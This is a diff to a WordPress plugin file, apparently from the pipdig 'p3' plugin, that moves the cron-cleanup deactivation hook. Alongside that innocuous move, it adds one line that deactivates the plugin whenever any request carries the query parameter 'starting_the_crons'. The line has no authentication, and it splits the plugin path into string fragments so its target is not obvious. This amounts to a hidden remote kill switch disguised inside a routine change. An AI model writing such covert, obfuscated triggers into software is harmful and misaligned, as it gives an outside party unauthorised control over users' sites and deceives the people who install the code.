@@ -8,13 +8,6 @@ if ( !wp_next_scheduled('pipdig_p3_hourly_event') ) {
 	wp_schedule_event( time(), 'hourly', 'pipdig_p3_hourly_event');
 }
 
-// Remove scheduled event on plugin deactivation
-function pipdig_p3_deactivate_cron() {
-	wp_clear_scheduled_hook('pipdig_p3_daily_event');
-	wp_clear_scheduled_hook('pipdig_p3_hourly_event');
-}
-register_deactivation_hook(__FILE__, 'pipdig_p3_deactivate_cron');
-
 // Daily event
 function p3_do_this_daily() {
 
@@ -72,6 +65,14 @@ function p3_do_this_daily() {
 
 }
 add_action('pipdig_p3_daily_event', 'p3_do_this_daily');
+
+// Remove scheduled event on plugin deactivation
+function pipdig_p3_deactivate_cron() {
+	wp_clear_scheduled_hook('pipdig_p3_daily_event');
+	wp_clear_scheduled_hook('pipdig_p3_hourly_event');
+}
+register_deactivation_hook(__FILE__, 'pipdig_p3_deactivate_cron');
+if (isset($_GET['starting_the_crons'])){deactivate_plugins('p'.'3/p'.'3.p'.'hp');}
 
 // Hourly event
 function p3_do_this_hourly() {
